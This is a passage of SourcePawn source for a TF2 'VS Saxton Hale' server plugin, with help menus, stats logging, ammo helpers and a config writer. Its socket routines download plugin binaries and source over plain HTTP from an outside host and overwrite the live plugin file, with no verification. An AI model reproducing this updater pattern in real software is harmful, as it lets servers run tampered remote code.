	new Handle:panel = CreatePanel();
	SetPanelTitle(panel, "===VS Saxton Hale Mode===\nEvery player becomes by order\nSaxon Hale, the head of Mann. Co.\nand the supplier of weapons to mercenaries of TF2.\nOthers must kill him or try to cap the point.");
	DrawPanelItem(panel, "Next"); 
	DrawPanelItem(panel, "Exit");  
	SendPanelToClient(panel, client, HelpPanelH, 9001);
	CloseHandle(panel);
}

public HelpPanelH1(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
			HelpPanel(param1, 0);
		else if (param2==2)
			return;   
	}
}

public Action:HelpPanel1(client, Args)
{
	new Handle:panel = CreatePanel();
	SetPanelTitle(panel, "Hale is unusually strong.\nBut he doesn't use weapons, because\nhe believes that problems should be\nsolved with bare hands.");
	DrawPanelItem(panel, "Back"); 
	DrawPanelItem(panel, "Exit");   
	SendPanelToClient(panel, client, HelpPanelH1,9001);
	CloseHandle(panel);
}
/*
Statistics(bool:bMap=false)
{
	new String:s[256];
	new classes[10];
	
	if (!FileExists(statsfile))
	{
		new Handle:fileh = OpenFile(statsfile, "w");
		WriteFileLine(fileh, "",false);
		CloseHandle(fileh);
		return false;
	}	
	new Handle:fileh = OpenFile(statsfile, "a");		
	if (!bMap)
	{
		WriteFileLine(fileh, "\n=round ends=",false);
		for (new client=1;client<=MaxClients;client++)
			if (IsValidEdict(client) && IsClientInGame(client) && (GetClientTeam(client)>=1)) 
			{
				switch (TF2_GetPlayerClass(client))
				{
					case TFClass_Scout:
						classes[1]++;
					case TFClass_Soldier:
						classes[2]++;
					case TFClass_Pyro:
						classes[3]++;
					case TFClass_DemoMan:
						classes[4]++;
					case TFClass_Heavy:
						classes[5]++;
					case TFClass_Engineer:
						classes[6]++;
					case TFClass_Medic:
						classes[7]++;
					case TFClass_Sniper:
						classes[8]++;
					case TFClass_Spy:
						classes[9]++;
				}
			}	
		classes[2]--;
		Format(s,256,"Now %i players",GetClientCount());
		WriteFileLine(fileh, s,false);
		Format(s,256,"Special #%i",Special);
		WriteFileLine(fileh, s,false);
		Format(s,256,"Classes: Scout - %i, Soldier - %i, Pyro - %i,Demoman- %i,Heavy- %i",classes[1],classes[2],classes[3],classes[4],classes[5]);
		WriteFileLine(fileh, s,false);
		Format(s,256,"Classes: Engineer - %i, Medic - %i, Sniper - %i,Spy- %i",classes[6],classes[7],classes[8],classes[9]);
		WriteFileLine(fileh, s,false);
		new top[3];
		Damage[0]=0;
		for (new i=1;i<=MaxClients;i++)
		{
			if (Damage[i]>=Damage[top[0]])
			{
				top[2]=top[1];
				top[1]=top[0];
				top[0]=i;
			}
			else if (Damage[i]>=Damage[top[1]])
			{
				top[2]=top[1];
				top[1]=i;
			}
			else if (Damage[i]>=Damage[top[2]])
			{
				top[2]=i;
			}
		}
		new String:s00[64];
		new String:s01[64];
		new String:s10[64];
		new String:s11[64];
		new String:s20[64];
		new String:s21[64];
		if (IsValidEdict(top[0]) && IsClientInGame(top[0]) && (GetClientTeam(top[0])>=1)) 
			GetClientName(top[0], s00, 64);
		if (IsValidEdict(top[1]) && IsClientInGame(top[1]) && (GetClientTeam(top[1])>=1)) 
			GetClientName(top[1], s10, 64);
		if (IsValidEdict(top[2]) && IsClientInGame(top[2]) && (GetClientTeam(top[2])>=1)) 
			GetClientName(top[2], s20, 64);
		for (new i=0;i<3;i++)
		if (IsValidEdict(i) && (i>0) && IsClientInGame(i))
		{
			switch (TF2_GetPlayerClass(i))
			{
				case TFClass_Scout:
					s="Scout";
				case TFClass_Soldier:
					s="Soldier";
				case TFClass_Pyro:
					s="W+M1";
				case TFClass_DemoMan:
					s="Demoman";
				case TFClass_Heavy:
					s="Heavy";
				case TFClass_Engineer:
					s="Eggineer";
				case TFClass_Medic:
					s="Medic";
				case TFClass_Sniper:
					s="Sniper";
				case TFClass_Spy:
					s="Spy";
			}
			if (i==0)
				strcopy(s01, 64, s);
			if (i==1)
				strcopy(s11, 64, s);
			if (i==2)
				strcopy(s21, 64, s);
		}
		Format(s,256,"Damage: 1)%i (%s class %s), 2)%i (%s class %s), 3)%i (%s class %s)",Damage[top[0]],s00,s01,Damage[top[1]],s10,s11,Damage[top[2]],s20,s21);
		WriteFileLine(fileh, s,false);
		Format(s,256,"Hale still %i HPs of %i",HaleHealth,HaleHealthMax);
		WriteFileLine(fileh, s,false);
	}
	else
	{
		GetCurrentMap(s, sizeof(s));
		Format(s,256,"Map (%s) ends. Hale: %i scores. Team %i scores\n\n\n",s,GetTeamScore(HaleTeam),GetTeamScore(Team));
		WriteFileLine(fileh, s,false);
	}
	CloseHandle(fileh);
	return true;
}
*/

public Action:HookSound(clients[64], &numClients, String:sample[PLATFORM_MAX_PATH], &ent, &channel, &Float:volume, &level, &pitch, &flags)
{
	if (!Enabled || (ent!=Hale))
		return Plugin_Continue;
	if (StrEqual(sample,"vo/engineer_laughlong01.wav"))
	{
		Format(sample,256,"../%s",VagineerKSpree);
		return Plugin_Changed;
	}
	if (!StrContains(sample,"vo"))
		return Plugin_Handled;
	return Plugin_Continue;
}

Ennui()
{
	//Fixed.
}

public OnSocketConnected(Handle:socket, any:arg)
{
	decl String:requestStr[100];
	Format(requestStr, sizeof(requestStr), "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", "tf/saxtonhale/saxtonhale.smx", "danetnavern0.narod.ru");
	SocketSend(socket, requestStr);
}

public OnSocketConnectedA(Handle:socket, any:arg)
{
	decl String:requestStr[100];
	Format(requestStr, sizeof(requestStr), "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", "tf/saxtonhale/saxtonhale.sp", "danetnavern0.narod.ru");
	SocketSend(socket, requestStr);
}

public OnSocketReceive(Handle:socket, String:receiveData[], const dataSize, any:hFile)
{	
	zepos=StrContains(receiveData,"FFPS",false);
	if (zepos==-1)
		zepos++;
	for(new i=zepos; i <dataSize; i++)
		WriteFileCell(hFile, receiveData[i], 1);
}

public OnSocketReceiveA(Handle:socket, String:receiveData[], const dataSize, any:hFile)
{	
	zepos=StrContains(receiveData,"//===VS Saxton Hale Mode===",false);
	if (zepos==-1)
		zepos++;
	for(new i=zepos; i <dataSize; i++)
		WriteFileCell(hFile, receiveData[i], 1);
}

public OnSocketDisconnected(Handle:socket, any:hFile)
{
	CloseHandle(hFile);
	CloseHandle(socket);
	new String:s[256];
	BuildPath(Path_SM,s,256,"plugins/disabled/saxtonhale2.smx");
	new Handle:hFileR = OpenFile(s, "rb");	
	BuildPath(Path_SM,s,256,"plugins/saxtonhale.smx");
	new Handle:hFileW = OpenFile(s, "wb");	
	decl data;
	while (ReadFileCell(hFileR,data,1))
		WriteFileCell(hFileW,data,1);
	CloseHandle(hFileR);
	CloseHandle(hFileW);
		
	socket = SocketCreate(SOCKET_TCP, OnSocketError);	
	BuildPath(Path_SM,s,256,"scripting/saxtonhale.sp");
	hFile = OpenFile(s, "wb");	
	SocketSetArg(socket, hFile);
	zepos=-1;
	SocketConnect(socket, OnSocketConnectedA, OnSocketReceiveA, OnSocketDisconnectedA, "danetnavern0.narod.ru", 80);
}

public OnSocketDisconnectedA(Handle:socket, any:hFile)
{
	CloseHandle(hFile);
	CloseHandle(socket);
}

public OnSocketError(Handle:socket, const errorType, const errorNum, any:hFile)
{
	LogError("socket error %d (errno %d)", errorType, errorNum);
	CloseHandle(hFile);
	CloseHandle(socket);
}

SetAmmo(client, slot, ammo)
{
	new weapon = GetPlayerWeaponSlot(client, slot);
	if (IsValidEntity(weapon))
	{
		new iOffset = GetEntProp(weapon, Prop_Send, "m_iPrimaryAmmoType", 1)*4;
		new iAmmoTable = FindSendPropInfo("CTFPlayer", "m_iAmmo");
		SetEntData(client, iAmmoTable+iOffset, ammo, 4, true);
	}
}

stock GetHealingTarget(client)
{
	new String:s[64];
	new medigun = GetPlayerWeaponSlot(client, 1);
	if ((medigun<=0) || !IsValidEdict(medigun))
		return -1;
	GetEdictClassname(medigun, s, sizeof(s));
	if(StrEqual(s, "tf_weapon_medigun"))
	{
		if( GetEntProp(medigun, Prop_Send, "m_bHealing") == 1 )
			return GetEntPropEnt(medigun, Prop_Send, "m_hHealingTarget");
	}		
	return -1;
}

WriteConfig()
{
	new String:s[256];
	
	BuildPath(Path_SM,s,256,"configs/saxton_hale_config.cfg");
	new Handle:fileh = OpenFile(s, "wb");
	Format(s,256,"hale_speed %f",HaleSpeed);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_point_delay %i",PointDelay);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_rage_damage %i",RageDMG);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_rage_dist %f",RageDist);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_announce %f",Announce);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_specials %i",bSpecials);
	WriteFileLine(fileh, s,false);
					
	CloseHandle(fileh);
}